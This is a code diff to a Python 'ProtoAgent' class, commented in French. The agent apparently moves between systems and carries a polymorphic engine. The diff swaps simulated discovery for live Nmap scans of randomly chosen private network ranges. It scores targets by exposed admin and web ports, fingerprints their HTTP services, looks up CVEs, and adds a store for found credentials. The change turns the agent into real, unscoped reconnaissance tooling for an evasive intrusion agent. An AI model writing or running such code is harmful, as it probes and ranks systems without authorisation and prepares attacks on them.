@@ -10,7 +10,10 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 
 from utils.crypto_utils import CryptoManager
 from utils.network_utils import MulticastBeacon
+from utils.cve_database import CVEDatabase
 from proto_agent.polymorphic import PolymorphicEngine
+from proto_agent.recon.nmap_scanner import NmapScanner
+from proto_agent.recon.fingerprint import Fingerprinter
 
 
 class ProtoAgent:
@@ -27,8 +30,17 @@ class ProtoAgent:
         # Polymorphisme
         self.polymorph = PolymorphicEngine()
         
-        # Connaissances accumulées
-        self.knowledge = {}
+        # Modules de reconnaissance RÉELS
+        self.scanner = NmapScanner()
+        self.fingerprinter = Fingerprinter()
+        self.cve_db = CVEDatabase()
+        
+        # Connaissances accumulées (structure améliorée)
+        self.knowledge = {
+            'systems': {},  # {ip: {ports, services, os, vulns}}
+            'paths': [],    # Chemins d'accès découverts
+            'credentials': []  # Credentials trouvés
+        }
         self.scripts = []
         self.current_location = config.get('initial_location', 'unknown')
         self.travel_history = [self.current_location]
@@ -136,34 +148,95 @@ class ProtoAgent:
                 await self._gather_local_intel(target)
     
     async def _discover_nearby(self) -> List[Dict]:
-        """Découvre les systèmes à proximité"""
-        # Simulation de découverte
+        """Découvre les systèmes à proximité - VRAI SCAN RÉSEAU"""
+        print(f"[{self.node_id}] Starting network discovery...")
+        
         nearby = []
         
-        # Dans un vrai système: scan réseau, énumération, etc.
-        # Ici: simulation simple
-        for i in range(random.randint(1, 5)):
-            system = {
-                'id': f'system_{random.randint(1000, 9999)}',
-                'ip': f'192.168.{random.randint(1, 255)}.{random.randint(1, 255)}',
-                'reachable': random.random() > 0.3,
-                'services': random.randint(1, 10)
-            }
-            nearby.append(system)
+        try:
+            # Déterminer la plage réseau à scanner depuis current_location
+            # Pour l'instant, scan d'une sous-plage aléatoire du réseau local
+            base_ip = f'192.168.{random.randint(1, 254)}'
+            scan_range = f'{base_ip}.{random.randint(1, 250)}-{random.randint(1, 254)}'
+            
+            # VRAI scan Nmap (mode fast pour ne pas être trop lent)
+            print(f"[{self.node_id}] Scanning {scan_range}...")
+            scan_results = await asyncio.to_thread(
+                self.scanner.scan_network, scan_range, 'fast'
+            )
+            
+            # Conversion des résultats Nmap en format interne
+            for ip, host_info in scan_results.items():
+                if host_info['state'] == 'up':
+                    system = {
+                        'id': f'system_{ip.replace(".", "_")}',
+                        'ip': ip,
+                        'hostname': host_info.get('hostname', 'unknown'),
+                        'reachable': True,
+                        'ports': len(host_info.get('ports', [])),
+                        'services': host_info.get('ports', []),
+                        'os': host_info.get('os', []),
+                        'scan_time': host_info.get('scan_time')
+                    }
+                    
+                    # Stockage dans knowledge base
+                    self.knowledge['systems'][ip] = {
+                        'ports': host_info.get('ports', []),
+                        'os': host_info.get('os', []),
+                        'hostname': host_info.get('hostname'),
+                        'discovered_at': time.time(),
+                        'discoverer': self.node_id
+                    }
+                    
+                    nearby.append(system)
+            
+            print(f"[{self.node_id}] Discovered {len(nearby)} systems")
+            
+        except Exception as e:
+            print(f"[{self.node_id}] Network discovery failed: {e}")
+            # Fallback vers simulation si scan échoue
+            nearby = []
         
         return nearby
     
     def _select_target(self, nearby_systems: List[Dict]) -> Optional[Dict]:
-        """Sélectionne une cible pour exploration"""
+        """Sélectionne une cible pour exploration - ANALYSE RÉELLE"""
         # Filtre systèmes accessibles
         reachable = [s for s in nearby_systems if s.get('reachable')]
         
         if not reachable:
             return None
         
-        # Sélection pondérée (plus de services = plus intéressant)
-        weights = [s.get('services', 1) for s in reachable]
-        target = random.choices(reachable, weights=weights)[0]
+        # Calcul de score d'intérêt pour chaque système
+        scored_targets = []
+        for system in reachable:
+            score = 0
+            
+            # Plus de ports ouverts = plus intéressant
+            score += system.get('ports', 0) * 10
+            
+            # Services web (80, 443, 8080) = très intéressant
+            services = system.get('services', [])
+            web_ports = [80, 443, 8080, 8443]
+            for svc in services:
+                if isinstance(svc, dict) and svc.get('port') in web_ports:
+                    score += 50
+            
+            # Services admin (22, 3389, 3306) = très intéressant
+            admin_ports = [22, 23, 3389, 3306, 5432]
+            for svc in services:
+                if isinstance(svc, dict) and svc.get('port') in admin_ports:
+                    score += 40
+            
+            scored_targets.append((system, score))
+        
+        # Tri par score et sélection probabiliste pondérée
+        scored_targets.sort(key=lambda x: x[1], reverse=True)
+        
+        weights = [s[1] + 1 for s in scored_targets]  # +1 pour éviter 0
+        target = random.choices([s[0] for s in scored_targets], weights=weights)[0]
+        
+        print(f"[{self.node_id}] Selected target {target['ip']} (score: {[s[1] for s in scored_targets if s[0] == target][0]})")
         
         return target
     
@@ -203,28 +276,99 @@ class ProtoAgent:
         self.current_location = target['id']
         self.travel_history.append(target['id'])
         
-        # Enregistrement du chemin
-        self.knowledge[f"path_{old_location}_{target['id']}"] = {
+        # Enregistrement du chemin dans la structure paths
+        path_record = {
             'from': old_location,
             'to': target['id'],
+            'to_ip': target.get('ip'),
             'timestamp': time.time(),
-            'method': 'simulated'
+            'method': 'discovered',
+            'proto_agent': self.node_id
         }
+        
+        self.knowledge['paths'].append(path_record)
     
     async def _gather_local_intel(self, target: Dict):
-        """Collecte des informations sur le système local"""
+        """Collecte des informations sur le système local - FINGERPRINTING RÉEL"""
         print(f"[{self.node_id}] Gathering intel on {target['id']}")
         
-        # Simulation collecte
+        target_ip = target.get('ip')
         intel = {
             'type': 'system',
             'id': target['id'],
-            'ip': target.get('ip'),
+            'ip': target_ip,
             'discovered_at': time.time(),
-            'discoverer': self.node_id
+            'discoverer': self.node_id,
+            'fingerprint': {},
+            'vulnerabilities': []
         }
         
-        self.knowledge[target['id']] = intel
+        try:
+            # HTTP Fingerprinting si port web ouvert
+            services = target.get('services', [])
+            web_ports = [80, 443, 8080, 8443]
+            
+            for svc in services:
+                if isinstance(svc, dict) and svc.get('port') in web_ports:
+                    port = svc['port']
+                    protocol = 'https' if port in [443, 8443] else 'http'
+                    url = f"{protocol}://{target_ip}:{port}"
+                    
+                    print(f"[{self.node_id}] Fingerprinting {url}...")
+                    
+                    # VRAI fingerprinting HTTP
+                    fingerprint = await asyncio.to_thread(
+                        self.fingerprinter.http_fingerprint, url
+                    )
+                    
+                    intel['fingerprint'] = fingerprint
+                    
+                    # Identification des vulnérabilités basée sur fingerprint
+                    vulns = self.fingerprinter.identify_vulnerabilities(fingerprint)
+                    intel['vulnerabilities'].extend(vulns)
+                    
+                    break  # Un seul port web pour l'instant
+            
+            # Identification de vulnérabilités CVE pour chaque service
+            for svc in services:
+                if isinstance(svc, dict):
+                    service_name = svc.get('service', '')
+                    version = svc.get('version', '')
+                    product = svc.get('product', '')
+                    
+                    if product and version:
+                        # Recherche CVE
+                        print(f"[{self.node_id}] Searching CVEs for {product} {version}...")
+                        
+                        cves = await asyncio.to_thread(
+                            self.cve_db.search_by_service, product, version
+                        )
+                        
+                        if cves:
+                            print(f"[{self.node_id}] Found {len(cves)} CVEs for {product} {version}")
+                            
+                            for cve in cves[:5]:  # Top 5 CVEs
+                                intel['vulnerabilities'].append({
+                                    'type': 'cve',
+                                    'cve_id': cve['cve_id'],
+                                    'cvss_score': cve['cvss_score'],
+                                    'description': cve['description'][:200],
+                                    'service': f"{product} {version}",
+                                    'port': svc.get('port')
+                                })
+            
+            # Stockage dans knowledge base
+            if target_ip in self.knowledge['systems']:
+                self.knowledge['systems'][target_ip].update({
+                    'fingerprint': intel['fingerprint'],
+                    'vulnerabilities': intel['vulnerabilities']
+                })
+            
+            print(f"[{self.node_id}] Intel gathered: {len(intel['vulnerabilities'])} vulnerabilities found")
+            
+        except Exception as e:
+            print(f"[{self.node_id}] Intel gathering failed: {e}")
+        
         self.discoveries.append(intel)
     
     def _should_engage(self, peer_beacon: Dict) -> bool:
